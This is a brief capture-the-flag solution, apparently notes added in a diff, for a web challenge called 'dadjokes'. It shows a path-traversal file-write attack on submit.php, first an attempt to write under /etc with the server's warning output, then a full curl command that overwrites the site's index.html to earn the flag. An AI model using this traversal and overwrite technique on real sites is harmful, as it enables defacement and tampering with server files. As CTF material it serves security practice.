@@ -1,0 +1,22 @@
+http://timesink.be/dadjokes/index_backup.html
+
+http://timesink.be/dadjokes/jokes/submit.php
+
+
+/dadjokes/jokes/submit.php?filename=/etc/passwd.txt&title=/etc/passwd&content=b&submit=true
+	
+	Warning: fopen(): open_basedir restriction in effect. File(/etc/passwd.txt) is not within the allowed path(s): (/home/kevinay5/domains/timesink.be/:/home/kevinay5/domains/include/:/etc/pki/tls/certs:/tmp:/var/tmp:/usr/local/lib/php/:/usr/local/php55/lib/php/:/usr/local/php0/lib/php/) in /home/kevinay5/domains/timesink.be/public_html/dadjokes/jokes/submit.php on line 11
+
+	Warning: fopen(/etc/passwd.txt): failed to open stream: Operation not permitted in /home/kevinay5/domains/timesink.be/public_html/dadjokes/jokes/submit.php on line 11
+
+	Warning: fwrite() expects parameter 1 to be resource, boolean given in /home/kevinay5/domains/timesink.be/public_html/dadjokes/jokes/submit.php on line 12
+
+	Warning: fclose() expects parameter 1 to be resource, boolean given in /home/kevinay5/domains/timesink.be/public_html/dadjokes/jokes/submit.php on line 13
+	your dad joke has been uploaded!
+
+	The joke is not in the index yet, I will review it first to keep you perverts out!
+
+Object: Can you bring it back and remove the defaced page?
+
+curl 'http://timesink.be/dadjokes/jokes/submit.php?filename=../index.html&title=index&submit=true&content=%0D%0A%3Chtml%3E%3Ctitle%3EDadJokes%2C+your+source+of+lame+dad+jokes%3C%2Ftitle%3E%3Cbody%3E%3Cdiv+align%3D%22center%22%3E%3Ch1%3EDadJokes%3C%2Fh1%3E%3Chr%3E%3Cimg+src%3D%22images%2Fbanner.png%22+alt%3D%22dadjokes%22%3E%3Cbr%3E%3Cbr%3E%3Ca+href%3D%22jokes%2Fread.php%22%3ERead+dad+jokes%3C%2Fa%3E%3Cbr%3E%3Cbr%3E%3Ca+href%3D%22jokes%2Fsubmit.php%22%3Esubmit+your+own+jokes%3C%2Fa%3E%3C%2Fdiv%3E%3C%2Fhtml%3E'
+	Congratulations, the flag is brixelCTF{lamejoke}
